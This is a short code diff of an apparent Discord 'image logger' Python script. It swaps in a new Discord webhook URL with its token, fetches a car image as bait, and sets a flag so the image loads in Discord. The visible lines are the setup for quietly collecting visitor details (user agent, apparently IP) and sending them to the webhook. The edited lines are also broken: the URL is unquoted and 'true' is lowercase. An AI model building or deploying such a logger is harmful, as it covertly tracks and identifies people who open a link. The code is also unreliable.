@@ -2,8 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-requests
-httpagentparser'
+webhook = https://discordapp.com/api/webhooks/1479999572087541780/PriDruVtZqALQug6MWdCaJ5aT1KHiR0YDURCdAi4c-QYgx779syH4gY_6zdDs-l5PC7v
 
 bindata = httpx.get('https://www.autocar.co.uk/sites/autocar.co.uk/files/styles/body-image/public/mercedes-amg-gt-4dr-ev-autocar-render.jpg?itok=vximMgfk').content
 buggedimg = true # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
